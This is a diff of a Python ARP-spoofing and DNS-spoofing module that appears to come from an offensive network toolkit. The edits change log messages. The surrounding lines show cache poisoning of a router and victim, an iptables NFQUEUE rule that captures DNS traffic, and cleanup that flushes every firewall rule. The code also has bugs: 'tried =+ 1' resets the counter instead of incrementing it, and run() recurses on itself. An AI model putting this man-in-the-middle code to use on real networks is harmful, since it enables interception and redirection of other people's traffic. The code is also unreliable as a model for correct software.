@@ -113,7 +113,7 @@ class ArpSpoofer(threading.Thread):
 				tried =+ 1
 				self.run()
 			printInfo("Giving up...")
-			self.controller.error = "[err] Could not find router MAC address!"
+			self.controller.error = "[-] Could not find router MAC address!"
 			self.controller.kill = True
 		if victimMAC == None:
 			printError("Could not find victim MAC address!")
@@ -122,14 +122,14 @@ class ArpSpoofer(threading.Thread):
 				tried =+ 1
 				self.run()
 			printInfo("Giving up...")
-			self.controller.error = "[err] Could not find victim MAC address!"
+			self.controller.error = "[-] Could not find victim MAC address!"
 			self.controller.kill = True
 
 		while 1:
 			if self.controller.kill == True:
 				self.restore(self.router, self.victim, routerMAC, victimMAC)
 				os.system('echo "0" >> /proc/sys/net/ipv4/ip_forward')
-				printInfo("ARP spoofing stopped.")
+				printInform("ARP spoofing stopped.")
 				return
 			self.poison(self.router, self.victim, routerMAC, victimMAC)
 			time.sleep(1.5)
@@ -163,8 +163,7 @@ hostlist = []
 
 def run():
 	if importerror == True:
-		printError("Netfilterqueue isn't imported!")
-		printInfo("Install the dependencies and reload this module!")
+		printError("Netfilterqueue is not imported!")
 		print("Traceback:\n"+str(error))
 		return
 
@@ -198,7 +197,7 @@ def run():
 		arpspoof = ArpSpoofer(variables["router"][0], variables["target"][0], controller)
 		arpspoof.start()
 
-	printInfo("Ctrl + C to stop.")
+	printInform("Ctrl-C to stop.")
 	os.system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE --queue-num 1')
 	try:
 		q = NetfilterQueue()
@@ -210,7 +209,7 @@ def run():
 			q.unbind()
 			os.system('iptables -F')
 			os.system('iptables -X')
-			printInfo("DNS spoof stopped.")
+			printInform("DNS spoof stopped.")
 	except:
 		printError("Unexcepted error:\n")
 		traceback.print_exc(file=sys.stdout)
